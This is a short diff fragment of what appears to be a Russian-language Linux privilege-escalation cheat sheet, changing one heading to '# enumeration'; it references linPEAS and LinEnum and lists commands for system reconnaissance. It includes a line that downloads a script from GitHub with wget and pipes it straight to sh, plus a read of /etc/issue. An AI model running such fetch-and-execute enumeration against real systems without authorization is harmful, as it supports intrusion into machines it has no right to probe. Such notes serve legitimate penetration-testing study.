@@ -9,7 +9,7 @@ https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
 
 wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh | sh
 
-Информация о системе в txt-файле:
+# enumeration
 
         дистрибутив;
             cat /etc/issue
